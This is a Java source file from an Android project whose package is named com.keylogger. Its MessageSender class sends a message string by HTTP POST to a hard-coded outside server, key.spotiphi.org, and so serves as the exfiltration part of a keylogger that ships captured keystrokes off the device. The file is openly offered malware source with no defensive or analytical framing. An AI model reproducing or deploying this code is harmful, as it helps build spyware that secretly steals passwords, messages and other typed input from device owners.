package com.keylogger;

import android.os.AsyncTask;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MessageSender extends AsyncTask<String, Void, Void> {

	@Override
	protected Void doInBackground(String... params) {
		String message = params[0];
		String urlString = "http://key.spotiphi.org"; // Server URL

		HttpURLConnection urlConnection = null;

		try {
			// Create URL object
			URL url = new URL(urlString);

			// Open the connection
			urlConnection = (HttpURLConnection) url.openConnection();

			// Set request method to POST
			urlConnection.setRequestMethod("POST");

			// Enable output to send the POST data
			urlConnection.setDoOutput(true);

			// Set headers (optional)
			urlConnection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");

			// Prepare the POST data
			String postData = "message=" + message;

			// Write data to the connection
			try (OutputStream outputStream = urlConnection.getOutputStream()) {
				outputStream.write(postData.getBytes());
				outputStream.flush();
			}

			// Check the response code
			int responseCode = urlConnection.getResponseCode();
			if (responseCode == HttpURLConnection.HTTP_OK) {
				// Success
			} else {
				// Handle server errors or other responses
			}

		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (urlConnection != null) {
				urlConnection.disconnect();
			}
		}
		return null;
	}
}
